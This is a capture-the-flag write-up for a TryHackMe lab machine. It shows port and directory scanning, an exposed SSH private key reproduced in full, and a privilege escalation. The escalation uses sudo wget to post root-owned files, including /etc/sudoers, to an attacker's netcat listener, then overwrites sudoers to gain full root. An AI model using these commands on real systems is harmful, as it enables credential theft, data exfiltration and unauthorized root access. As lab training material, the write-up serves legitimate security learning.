# THM - wgelctf

## IP address
10.10.37.40

## Write Up
1. do an Nmap scan.
```bash
#make a directory to store where you are going to store you nmap results
mkdir nmap
#scan for open ports and direct results to nmap/initial
nmap -p- -sV -sC -oN nmap/initial 10.10.37.40
```
2. The name results will result as shown:
```
root@kali:~# nmap -p- -sV -sC -oN nmap/initial 10.10.37.40
Starting Nmap 7.80 ( https://nmap.org ) at 2020-04-24 04:16 UTC
Nmap scan report for ip-10-10-37-40.eu-west-1.compute.internal (10.10.37.40)
Host is up (0.00078s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
|_  256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:DB:E0:19:ED:D8 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
```
- Port ```22``` and port ```80``` is open.
- going to http://10.10.37.40:80 brings you to apache default page.

3. Explore other potential directories with gobuster.
```bash
#install gobuster if you dont have it already
sudo apt install gobuster

#run gobuster with dirbuster wordlists
gobuster dir -u http://10.10.37.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- You will notice that ```/sitemap``` is available.
```
/sitemap (Status: 301)
/server-status (Status: 403)
```

4. ```/sitemap``` will bring you to unapp template website. try running gobusters again on ```/sitemap```.
```bash
gobuster dir -u http://10.10.37.40/sitemap -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

- This will return a few more results:
```
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/sass (Status: 301)
```

5. Looking through the files, seems like there are not much information. We will try gobuster again with another wordlist txt.
```bash
gobuster dir -u http://10.10.37.40/sitemap -w /usr/share/wordlists/dirb/common.txt
```

- you will realised ```ssh``` is one of the available extension weirdly.
```
/.hta (Status: 403)
/.htpasswd (Status: 403)
/.ssh (Status: 301)
/.htaccess (Status: 403)
/css (Status: 301)
/fonts (Status: 301)
/images (Status: 301)
/index.html (Status: 200)
/js (Status: 301)
```

- Navigating to ```/.ssh``` you will gain access to a private id_rsa.
```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2mujeBv3MEQFCel8yvjgDz066+8Gz0W72HJ5tvG8bj7Lz380
m+JYAquy30lSp5jH/bhcvYLsK+T9zEdzHmjKDtZN2cYgwHw0dDadSXWFf9W2gc3x
W69vjkHLJs+lQi0bEJvqpCZ1rFFSpV0OjVYRxQ4KfAawBsCG6lA7GO7vLZPRiKsP
y4lg2StXQYuZ0cUvx8UkhpgxWy/OO9ceMNondU61kyHafKobJP7Py5QnH7cP/psr
+J5M/fVBoKPcPXa71mA/ZUioimChBPV/i/0za0FzVuJZdnSPtS7LzPjYFqxnm/BH
Wo/Lmln4FLzLb1T31pOoTtTKuUQWxHf7cN8v6QIDAQABAoIBAFZDKpV2HgL+6iqG
/1U+Q2dhXFLv3PWhadXLKEzbXfsAbAfwCjwCgZXUb9mFoNI2Ic4PsPjbqyCO2LmE
AnAhHKQNeUOn3ymGJEU9iJMJigb5xZGwX0FBoUJCs9QJMBBZthWyLlJUKic7GvPa
M7QYKP51VCi1j3GrOd1ygFSRkP6jZpOpM33dG1/ubom7OWDZPDS9AjAOkYuJBobG
SUM+uxh7JJn8uM9J4NvQPkC10RIXFYECwNW+iHsB0CWlcF7CAZAbWLsJgd6TcGTv
2KBA6YcfGXN0b49CFOBMLBY/dcWpHu+d0KcruHTeTnM7aLdrexpiMJ3XHVQ4QRP2
p3xz9QECgYEA+VXndZU98FT+armRv8iwuCOAmN8p7tD1W9S2evJEA5uTCsDzmsDj
7pUO8zziTXgeDENrcz1uo0e3bL13MiZeFe9HQNMpVOX+vEaCZd6ZNFbJ4R889D7I
dcXDvkNRbw42ZWx8TawzwXFVhn8Rs9fMwPlbdVh9f9h7papfGN2FoeECgYEA4EIy
GW9eJnl0tzL31TpW2lnJ+KYCRIlucQUnBtQLWdTncUkm+LBS5Z6dGxEcwCrYY1fh
shl66KulTmE3G9nFPKezCwd7jFWmUUK0hX6Sog7VRQZw72cmp7lYb1KRQ9A0Nb97
uhgbVrK/Rm+uACIJ+YD57/ZuwuhnJPirXwdaXwkCgYBMkrxN2TK3f3LPFgST8K+N
LaIN0OOQ622e8TnFkmee8AV9lPp7eWfG2tJHk1gw0IXx4Da8oo466QiFBb74kN3u
QJkSaIdWAnh0G/dqD63fbBP95lkS7cEkokLWSNhWkffUuDeIpy0R6JuKfbXTFKBW
V35mEHIidDqtCyC/gzDKIQKBgDE+d+/b46nBK976oy9AY0gJRW+DTKYuI4FP51T5
hRCRzsyyios7dMiVPtxtsomEHwYZiybnr3SeFGuUr1w/Qq9iB8/ZMckMGbxoUGmr
9Jj/dtd0ZaI8XWGhMokncVyZwI044ftoRcCQ+a2G4oeG8ffG2ZtW2tWT4OpebIsu
eyq5AoGBANCkOaWnitoMTdWZ5d+WNNCqcztoNppuoMaG7L3smUSBz6k8J4p4yDPb
QNF1fedEOvsguMlpNgvcWVXGINgoOOUSJTxCRQFy/onH6X1T5OAAW6/UXc4S7Vsg
jL8g9yBg4vPB8dHC6JeJpFFE06vxQMFzn6vjEab9GhnpMihrSCod
-----END RSA PRIVATE KEY-----
```

- I used ```vi``` to save this as ```id_rsa```

6. We can use john to see if there is any password for this id_rsa.
```bash
/usr/share/john/ssh2john.py id_rsa
```
- You will noticed that there is no password for this private rsa key
```
root@kali:~# /usr/share/john/ssh2john.py id_rsa
id_rsa has no password!
```

7. Now we will need to find the user of the private rsa key.
- This took me a long time... But you will realised under the dev console for http://10.10.37.40 there is a comment.
```
<!--Jessie don't forget to udate the webiste-->
```

8. Lets try ssh using ```jessie``` as the user to see if can gain any access.
```bash
#make sure that the id_rsa can only be read by you.
chmod 600 id_rsa

#ssh into jessie
ssh -i id_rsa jessie@10.10.37.40
```

- You will gain access into ```jessie``` account. Now to find the user flag.
```bash
jessie@CorpOne:~$ find . -name user*
./.local/share/keyrings/user.keystore
./.config/user-dirs.locale
./.config/user-dirs.dirs
./.config/dconf/user
./Documents/user_flag.txt
jessie@CorpOne:~$ 
```

## Previlege Escalation

9. Running ```sudo -l``` you will realised jessie will gain root access at ```/usr/bin/wget```
```
sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

10. We will now listen to our own IP while using ```wget``` to capture the flag:
```bash
root@kali:~# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc mq state UP group default qlen 1000
    link/ether 02:7a:a1:ad:83:da brd ff:ff:ff:ff:ff:ff
    inet 10.10.91.4/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 3476sec preferred_lft 3476sec
    inet6 fe80::7a:a1ff:fead:83da/64 scope link 
       valid_lft forever preferred_lft forever
root@kali:~# nc -lnvp 9001
listening on [any] 9001 ...
```

11. We will use ```sudo``` to ```wget``` the root file.
```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.10.91.4:9001
```

- You will get the response:
```root@kali:~# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.91.4] from (UNKNOWN) [10.10.37.40] 42012
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.91.4:9001
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

flag:xxxxxxxxxxxxxxxxxxx
```

## Bonus Attempts to Gain Root Shell

12. But where is the fun without gaining proper root access to the machine? Lets attempt that.
- Listen to the port as 9001 but now we will get ```/etc/sudoers``` instead
```bash
sudo /usr/bin/wget --post-file=/etc/sudoers http://10.10.91.4:9001
```
- Now we will save the ```sudoer``` file:
```
root@kali:~# nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.91.4] from (UNKNOWN) [10.10.37.40] 42014
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.10.91.4:9001
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 797

#
# This file MUST be edited with the 'visudo' command as root.
#
# Please consider adding local content in /etc/sudoers.d/ instead of
# directly modifying this file.
#
# See the man page for details on how to write a sudoers file.
#
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"

# Host alias specification

# User alias specification

# Cmnd alias specification

# User privilege specification
root    ALL=(ALL:ALL) ALL

# Members of the admin group may gain root privileges
%admin ALL=(ALL) ALL

# Allow members of group sudo to execute any command
%sudo   ALL=(ALL:ALL) ALL

# See sudoers(5) for more information on "#include" directives:

#includedir /etc/sudoers.d
jessie  ALL=(root) NOPASSWD: /usr/bin/wget
```

- Save this file and change:
```
#includedir /etc/sudoers.d
jessie  ALL=(ALL) NOPASSWD: ALL
```

- After saving it we will ```wget``` and replace ```sudoers```
```bash
#move to etc for easy access
cd /etc

#wget and replace
sudo /usr/bin/wget 10.10.91.4:9001/badsudo --output-document=sudoers
```


